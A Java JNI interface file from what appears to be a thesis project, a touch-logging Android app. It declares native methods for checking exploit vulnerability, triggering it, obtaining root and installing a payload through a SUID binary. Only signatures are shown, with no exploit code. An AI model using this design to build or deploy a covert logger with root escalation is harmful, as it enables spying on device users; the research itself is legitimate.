package org.leyfer.thesis.touchlogger_dirty.utils;

/**
 * Created by kirill on 18.03.17.
 */

public class JniApi {

    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public static native String stringFromJNI();

    public static native boolean prepareA(String localPath);

    public static native boolean prepareB(String localPath);

    public static native void triggerA();

    public static native void triggerB();

    public static native boolean normalInstallationIsPossible();

    public static native boolean isVulnerable(String baseDir);

    public static native boolean rootIsAvailable();

    public static native String getSuidBinaryPath(String execPayloadPath);

    public static native void installPayloadThroughSuid(String suidBinaryPath, String localPath);

    public static native void installPayloadNormally(String localPath);
}
